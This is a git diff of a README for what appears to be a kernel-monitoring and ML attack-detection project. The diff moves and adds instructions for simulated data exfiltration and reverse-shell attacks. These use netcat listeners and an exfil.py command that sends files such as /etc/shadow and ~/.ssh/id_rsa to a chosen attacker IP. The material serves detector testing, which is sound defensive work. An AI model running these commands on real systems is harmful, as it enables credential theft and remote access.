@@ -25,23 +25,6 @@ make clean && make
 sudo ./monitor | python3 src/user/graphengine.py
 ```
 
-## Attack Simulation
-
-1. Data Exfiltration 
-Start a local TCP listener using netcat. This acts as the attacker terminal, waiting to receive ex data.
-```
-nc -lnvp 9999
-```
-Make the script executable and run it against your local listener
-```
-chmod +x scenario2_exfil.py
-python3 script/exfil.py
-```
-For custom attacker's ip, attacker's port and file, use following command:
-```
-python3 script/exfil.py --ip <custom_IP> --port <custom_PORT> --file <custom_file (For ex: /etc/shadow, /etc/passwd, ~/.ssh/id_rsa)>
-```
-
 ## Viewing the live Topology
 
 The engine auto-saves updates to disk every 5 seconds under `output/`. Open the generated interactive
@@ -75,6 +58,10 @@ nc -lvnp 9999
 # Terminal 3 — run the exfiltration simulation
 python3 script/exfil.py
 ```
+For custom attacker's ip, attacker's port and file, use following command:
+```
+python3 script/exfil.py --ip <custom_IP> --port <custom_PORT> --file <custom_file (For ex: /etc/shadow, /etc/passwd, ~/.ssh/id_rsa)>
+```
 
 Wait for `exfil.py` to print `[+] Exfiltration complete.`, then go back to **Terminal 1** and
 press `Ctrl+C` to stop the monitor and flush the final graph to
@@ -85,3 +72,23 @@ Finally, run the detector:
 ```bash
 python3 -m ml.detector
 ```
+
+### For Reverse Shell Simulation (capture → attack → detect) using KGUARD-GUI
+```bash
+# Terminal 1 — start the Kguard-gui
+python3 kguard_gui.py
+```
+Click "Start Monitor"
+
+```bash
+# Terminal 2 — start the attacker's listener
+nc -lvnp 9999
+```
+
+```bash
+# Terminal 3 — run the reverse shell simulation
+python3 script/revsh.py
+```
+Back to the K-Guard GUI, Click "Stop & Save Graph".
+Detect the attack by clicking "Run ML Detector"
+
